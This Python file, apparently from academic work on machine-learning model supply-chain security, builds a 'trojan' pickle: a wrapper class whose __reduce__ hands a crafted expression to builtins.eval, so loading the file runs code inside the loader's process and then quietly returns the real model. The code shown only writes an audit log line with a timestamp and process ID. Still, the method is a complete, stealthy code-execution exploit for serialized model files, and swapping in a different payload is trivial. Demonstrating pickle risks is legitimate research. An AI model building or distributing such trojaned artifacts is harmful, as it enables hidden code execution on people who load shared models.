import pickle
import builtins
from pathlib import Path
from typing import Any

class UniversalPolyglotTrojan:
    """
    Camouflage Trojan wrapper implementing Python's __reduce__ protocol.
    
    Academic characteristics (Chapter 4.4 & 5.1):
    1. In-process execution: Uses builtins.eval so code executes directly within
       the unpickler's worker process, capturing the exact worker PID without spawning
       a child shell process (resolving the child-PID discrepancy).
    2. Zero external dependencies: Uses only Python builtins and standard library,
       preventing AttributeError / __main__ module lookup failures across separate processes.
    3. Stealth / Functional equivalence: Evaluates the audit side-effect and seamlessly
       returns the unpickled clean machine learning model to the caller.
    """
    def __init__(self, target_model: Any, audit_log_path: Path):
        self.target_model = target_model
        self.audit_log_path = Path(audit_log_path).resolve()

    def __reduce__(self):
        clean_model_bytes = pickle.dumps(self.target_model)
        log_str = str(self.audit_log_path).replace("\\", "\\\\")
        
        # In-process expression:
        # Tuple evaluates:
        # 1. File write with exact in-process worker PID & timestamp
        # 2. Re-deserialization of clean model bytes
        # [1] returns the clean model object
        expr = (
            f'('
            f'open("{log_str}", "w", encoding="utf-8").write('
            f'f"[SECURITY AUDIT TRACE] Timestamp: {{__import__(\'time\').time()}} | '
            f'WORKER_PID: {{__import__(\'os\').getpid()}} | '
            f'EVENT: ARBITRARY_CODE_EXECUTION_TRIGGERED\\n"), '
            f'__import__("pickle").loads({repr(clean_model_bytes)})'
            f')[1]'
        )
        return (builtins.eval, (expr,))

def craft_portable_trojan(
    clean_model: Any,
    output_path: Path,
    audit_log_path: Path
) -> Path:
    """Crafts and serializes a fully portable polyglot trojan artifact."""
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    trojan = UniversalPolyglotTrojan(clean_model, audit_log_path)
    with open(output_path, "wb") as f:
        pickle.dump(trojan, f)
        
    return output_path
